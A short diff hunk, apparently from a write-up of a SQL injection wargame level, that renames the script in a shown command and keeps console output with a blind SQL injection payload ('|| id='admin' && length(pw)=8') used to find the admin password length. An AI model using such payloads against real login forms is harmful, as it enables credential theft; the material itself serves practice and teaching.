@@ -56,7 +56,7 @@ print(f"Final payload: ?pw={password}")
 ```
 
 ```
-$ python .\losqli.py
+$ python .\orge_script.py
 
 Payload: ?pw=' || id='admin' && length(pw)=8 -- -
 Password length: 8
